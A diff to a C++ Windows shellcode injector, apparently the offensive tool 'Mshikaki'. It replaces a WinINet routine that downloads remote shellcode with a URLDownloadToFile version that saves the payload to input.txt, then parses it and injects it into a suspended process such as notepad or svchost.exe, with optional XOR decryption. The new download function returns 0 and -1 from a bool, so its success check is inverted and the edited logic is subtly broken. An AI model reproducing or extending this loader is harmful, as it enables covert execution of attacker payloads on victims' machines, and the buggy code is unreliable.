@@ -7,6 +7,9 @@
 #include <iomanip>
 #include <tlhelp32.h>
 #include <stdlib.h>
+#include <Urlmon.h>
+#pragma comment(lib, "Urlmon.lib")
+
 #pragma comment(lib, "wininet.lib")
 
 using namespace std;
@@ -65,30 +68,19 @@ BOOL Injector(HANDLE hProcess, HANDLE hThread, const vector<char>& buf) {
     return TRUE;
 }
 
-bool FetchRemoteShellcode(const string& url, vector<char>& outShellcode) {
-    HINTERNET hInternet, hConnect;
-    DWORD bytesRead;
-    char buffer[1024];
+bool FetchRemoteShellcode(const wchar_t* srcURL) {
 
-    hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-    if (!hInternet) {
-        return false;
+    const wchar_t* destFile = L"input.txt";
+    if (S_OK == URLDownloadToFile(NULL, srcURL, destFile, 0, NULL))
+    {
+        printf("[+] Fetched Remote file");
+        return 0;
+    }
+    else
+    {     
+        return -1;
     }
 
-    hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
-    if (!hConnect) {
-        InternetCloseHandle(hInternet);
-        return false;
-    }
-
-    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
-        outShellcode.insert(outShellcode.end(), buffer, buffer + bytesRead);
-    }
-
-    InternetCloseHandle(hConnect);
-    InternetCloseHandle(hInternet);
-
-    return true;
 }
 
 void PrintHelpMenu(const string& programName) {
@@ -99,7 +91,6 @@ void PrintHelpMenu(const string& programName) {
     cout << "  -p <process>  : Name of a process (optional, default is notepad)" << endl;
     cout << "  -x <key>      : Apply XOR decryption with the specified key (optional)" << endl;
     cout << "  -h            : Display this help menu" << endl;
-    cout << "Example Usage: Mshikaki.exe -i input.txt -x SAUDISAUDI -p svchost.exe. \n  Mshikaki.exe -u input.txt " << endl; 
 }
 
 int main(int argc, char* argv[]) {
@@ -117,9 +108,11 @@ int main(int argc, char* argv[]) {
         string argument = argv[i];
         if (argument == "-i" && i + 1 < argc) {
             inputContent = argv[i + 1];
+
         }
         else if (argument == "-u" && i + 1 < argc) {
             remoteUrl = argv[i + 1];
+
         }
         else if (argument == "-x" && i + 1 < argc) {
             string keyString = argv[i + 1];
@@ -144,10 +137,12 @@ int main(int argc, char* argv[]) {
         payload = Parser(inputContent);
     }
     else if (!remoteUrl.empty()) {
-        if (!FetchRemoteShellcode(remoteUrl, payload)) {
-            cout << "Failed to fetch remote shellcode." << endl;
-            return 1;
-        }
+        wstring widestr = wstring(remoteUrl.begin(), remoteUrl.end());
+        const wchar_t* url = widestr.c_str();
+        if (!FetchRemoteShellcode(url)) {
+           inputContent = "input.txt";
+           payload = Parser(inputContent);
+                }
     }
     else {
         cout << "Please specify an input file or remote file location with hex shellcode. Use -h for help menu." << endl;
@@ -165,7 +160,7 @@ int main(int argc, char* argv[]) {
         wprintf(L"ERROR: (%d) Unable to Create Process\n", GetLastError());
         return 1;
     }
-    else if (path == true){
+    else if (path == true) {
         cout << "[+] Creating " << actproc << " process in a suspended state \n";
     }
 
